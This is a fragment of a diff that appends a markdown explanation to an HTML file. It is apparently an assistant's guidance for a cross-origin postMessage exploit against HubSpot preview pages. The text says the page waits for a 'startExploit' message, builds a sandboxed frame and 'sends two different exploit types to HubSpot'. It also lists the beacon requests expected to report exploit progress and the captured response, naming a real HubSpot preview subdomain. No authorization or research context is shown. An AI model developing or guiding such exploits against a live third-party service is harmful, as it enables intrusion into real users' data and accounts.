@@ -53,3 +53,31 @@ if(window.opener){
 </script>
 </body>
 </html>
+```
+
+---
+
+## **What this does:**
+
+1. **Logs EVERY message** it receives (so we can see if `startExploit` arrives)
+2. **Checks for `action: 'startExploit'`** specifically
+3. **Creates minimal sandbox** with compressed code
+4. **Sends two different exploit types** to HubSpot
+
+---
+
+## **After updating both files, you should see:**
+```
+/?step=1_clicked
+/?step=2_opened
+/?step=3_sending
+/?step=4_sent
+/?log=MSG_FROM=https://146256700.hubspotpreview-eu1.com_DATA={"action":"startExploit","timestamp":...}
+/?log=EXPLOIT_TRIGGERED
+/?log=SANDBOX_CREATED
+/?s=loaded_origin=null           <-- KEY!
+/?s=opened
+/?s=ready_15
+/?s=send1
+/?s=send2
+/?r={"type":"..."}               <-- THE RESPONSE!
